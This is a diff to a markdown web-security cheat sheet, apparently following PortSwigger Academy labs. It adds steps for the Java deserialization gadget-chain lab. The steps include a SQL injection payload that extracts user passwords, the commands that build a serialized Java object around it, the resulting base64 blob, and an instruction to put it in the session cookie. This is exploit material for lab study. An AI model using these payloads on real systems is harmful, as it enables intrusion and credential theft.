@@ -2730,6 +2730,21 @@ java.io.Serializable; readObject(); InputStream
   - replace last 2 lines with "puts Base64.encode64(payload)"
   - Run it and copy the output to session cookie  
 - Developing a **custom gadget chain for Java deserialization** (Expert)
+  - Download https://github.com/PortSwigger/serialization-examples/tree/master/java/solution
+  - Modify main.java
+    ```
+    ProductTemplate originalObject = new ProductTemplate("your-payload-here");
+
+    Payload: ' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
+    ```
+  - Create a serialized object
+    ```
+    $ javac Main.java
+    $ java Main
+      Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAXycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QocGFzc3dvcmQgQVMgbnVtZXJpYyksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgRlJPTSB1c2Vycy0t
+      Deserialized object ID: ' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
+    ```
+  - Replace the cookie session with this serialized object
 - Developing a **custom gadget chain for PHP deserialization** (Expert)
 
 ## Web LLM Attacks
